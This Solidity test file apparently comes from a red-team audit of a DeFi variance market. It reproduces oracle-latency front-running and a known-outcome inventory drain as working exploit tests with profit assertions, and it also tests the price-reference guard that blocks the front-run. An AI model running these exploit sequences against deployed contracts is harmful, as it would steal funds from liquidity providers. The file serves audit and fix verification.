// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ISwapVM} from "swap-vm/interfaces/ISwapVM.sol";
import {RedTeamBase} from "./RedTeamBase.sol";
import {IVarianceMarket, Side} from "../../src/interfaces/ITremor.sol";
import {MockPriceReference} from "../mocks/MockPriceReference.sol";

/// @notice Finding 2: oracle-latency front-run on the LIVE build (Stale guard only covers rounds already on-chain).
///         "unguarded" tests reproduce it with no price reference; "guarded" tests show the fix: with a market price
///         reference (the hook's block-start pool price in production) quotes pause once the market has moved more
///         than 2% from the last round, so the profitable moves can no longer be traded before the round lands.
///         Finding 3: fork-demo build (ALLOW_PAST_WINDOWS) sells LONG at the forward price after the outcome is known.
contract OracleAndReplayTest is RedTeamBase {
    address internal attacker = makeAddr("attacker");

    function _buyChunks(uint256 n, uint256 chunk) internal {
        ISwapVM.Order memory o = _order();
        for (uint256 i; i < n / chunk; ++i) {
            router.swap(o, WETH, longT, chunk, traits(attacker, false));
        }
    }

    function _sellAll(uint256 chunk) internal {
        ISwapVM.Order memory o = _order();
        uint256 bal = _bal(longT, attacker);
        while (bal > 0) {
            uint256 amt = bal < chunk ? bal : chunk;
            router.swap(o, longT, WETH, amt, traits(attacker, true));
            bal -= amt;
        }
    }

    function _latency(uint256 dt, uint256 movePpm, uint256 n) internal returns (int256 pnl) {
        _fork();
        P memory pp = forkParams();
        pp.sets = 500e18;
        pp.buyback = 100e18;
        _deploy(pp);
        _advanceTo(market.window(id).t0 + dt);
        deal(WETH, attacker, 1000e18);
        vm.startPrank(attacker);
        IERC20(WETH).approve(address(router), type(uint256).max);
        IERC20(longT).approve(address(router), type(uint256).max);
        uint256 w0 = _bal(WETH, attacker);
        uint256 mid0 = _mid();
        // 1) attacker sees the off-chain move / pending Chainlink transmit; quote is still "caught up" -> buy LONG
        _buyChunks(n, 0.5e18);
        vm.stopPrank();
        // 2) the Chainlink round lands
        vm.warp(block.timestamp + 12);
        lastPx = lastPx * (1e6 + movePpm) / 1e6;
        lastTs = block.timestamp;
        feed.push(int256(lastPx), lastTs);
        vm.expectRevert(IVarianceMarket.Stale.selector);
        market.quote(id, Side.LONG, false, true, 1e18, 0);
        // 3) attacker ingests it and sells back
        vm.startPrank(attacker);
        market.checkpoint(id, 64);
        _sellAll(0.5e18);
        vm.stopPrank();
        pnl = int256(_bal(WETH, attacker)) - int256(w0);
        console2.log("move ppm / LONG front-run tokens", movePpm, n);
        console2.log("  mid before / after round", mid0, _mid());
        console2.log("  attacker PnL (signed wei):");
        console2.logInt(pnl);
    }

    function test_oracleLatency_unguarded_5pctMove_nearExpiry_profitable() public {
        int256 pnl = _latency(7 days - 2 hours, 50_000, 20e18);
        assertGt(pnl, 0);
    }

    function test_oracleLatency_unguarded_5pctMove_windowStart_unprofitable() public {
        int256 pnl = _latency(2 hours, 50_000, 20e18);
        assertLt(pnl, 0);
    }

    function test_oracleLatency_unguarded_10pctMove_windowStart_profitable() public {
        int256 pnl = _latency(2 hours, 100_000, 20e18);
        assertGt(pnl, 0);
    }

    // ------------------------------------------------------------------ the fix: price-reference guard

    /// @dev the market moves `movePpm` before the round lands; returns blocked (quotes paused) or the trade's PnL
    function _latencyGuarded(uint256 dt, uint256 movePpm, uint256 n) internal returns (bool blocked, int256 pnl) {
        _fork();
        P memory pp = forkParams();
        pp.sets = 500e18;
        pp.buyback = 100e18;
        _deploy(pp);
        MockPriceReference ref = new MockPriceReference();
        market.setReference(address(ref), 0.02e18);
        _advanceTo(market.window(id).t0 + dt);
        ref.set(lastPx); // the market agrees with the last round
        deal(WETH, attacker, 1000e18);
        vm.startPrank(attacker);
        IERC20(WETH).approve(address(router), type(uint256).max);
        IERC20(longT).approve(address(router), type(uint256).max);
        uint256 w0 = _bal(WETH, attacker);
        // 1) the market moves; arbitrage moves the pool with it; the Chainlink round is still pending
        uint256 newPx = lastPx * (1e6 + movePpm) / 1e6;
        ref.set(newPx);
        try market.quote(id, Side.LONG, true, true, 1e18, 0) {}
        catch (bytes memory err) {
            assertEq(bytes4(err), IVarianceMarket.PriceMoved.selector, "paused by the guard");
            // the router path is paused too
            ISwapVM.Order memory o = _order();
            vm.expectRevert();
            router.swap(o, WETH, longT, 0.5e18, traits(attacker, false));
            vm.stopPrank();
            return (true, 0);
        }
        _buyChunks(n, 0.5e18);
        vm.stopPrank();
        // 2) the round lands
        vm.warp(block.timestamp + 12);
        lastPx = newPx;
        lastTs = block.timestamp;
        feed.push(int256(lastPx), lastTs);
        // 3) ingest it and sell back
        vm.startPrank(attacker);
        market.checkpoint(id, 64);
        _sellAll(0.5e18);
        vm.stopPrank();
        pnl = int256(_bal(WETH, attacker)) - int256(w0);
        console2.log("guarded: move ppm", movePpm);
        console2.log("  attacker PnL (signed wei):");
        console2.logInt(pnl);
    }

    function test_oracleLatency_guarded_5pctMove_nearExpiry_blocked() public {
        (bool blocked,) = _latencyGuarded(7 days - 2 hours, 50_000, 20e18);
        assertTrue(blocked);
    }

    function test_oracleLatency_guarded_10pctMove_windowStart_blocked() public {
        (bool blocked,) = _latencyGuarded(2 hours, 100_000, 20e18);
        assertTrue(blocked);
    }

    /// the largest move the guard lets through (just under 2%) does not pay: the spread exceeds the variance gain
    function test_oracleLatency_guarded_1_9pctMove_10minBeforeEnd_unprofitable() public {
        (bool blocked, int256 pnl) = _latencyGuarded(7 days - 10 minutes, 19_000, 20e18);
        assertFalse(blocked);
        assertLt(pnl, 0);
    }

    function test_oracleLatency_guarded_1_9pctMove_nearExpiry_unprofitable() public {
        (bool blocked, int256 pnl) = _latencyGuarded(7 days - 2 hours, 19_000, 20e18);
        assertFalse(blocked);
        assertLt(pnl, 0);
    }

    // ------------------------------------------------------------------ Finding 3: fork-demo build

    /// ALLOW_PAST_WINDOWS=true: quotes ignore staleness and t1, so once the realized week is public anyone buys every
    /// LONG at the forward-based price and redeems at the realized payout.
    function test_forkDemoBuild_knownOutcomeDrain() public {
        _fork();
        P memory pp = forkParams();
        pp.allowPast = true;
        _deploy(pp);
        uint64 t1 = market.window(id).t1;
        // a violent week happens (+-4% hourly) and is public, but nobody has checkpointed it (order deadline = t1, so
        // trade 30 min before t1; the real fork demo ships replay windows with deadline now + 30 days)
        while (lastTs + 1 hours <= t1 - 1 hours) {
            lastTs += 1 hours;
            lastPx = up ? lastPx * 104 / 100 : lastPx * 96 / 100;
            up = !up;
            feed.push(int256(lastPx), lastTs);
        }
        vm.warp(t1 - 30 minutes);
        assertFalse(market.caughtUp(id));
        deal(WETH, attacker, 100e18);
        vm.startPrank(attacker);
        IERC20(WETH).approve(address(router), type(uint256).max);
        uint256 w0 = _bal(WETH, attacker);
        console2.log("LONG mid quoted (stale, forward-based)", _mid());
        _buyChunks(48e18, 1e18); // the whole inventory but 2 tokens
        uint256 got = _bal(longT, attacker);
        uint256 paid = w0 - _bal(WETH, attacker);
        feed.push(int256(lastPx), t1 + 1); // first round >= t1
        vm.warp(t1 + 2 hours);
        for (uint256 i; i < 10; ++i) {
            if (market.checkpoint(id, 64) < 64) break;
        }
        market.finalize(id);
        uint256 out = market.redeem(id, got, 0);
        vm.stopPrank();
        console2.log("LONG bought / WETH paid", got, paid);
        console2.log("payoutLong per token / redeemed", market.window(id).payoutLong, out);
        console2.log("attacker profit (wei)", out - paid);
        assertGt(out, paid * 3);
    }
}
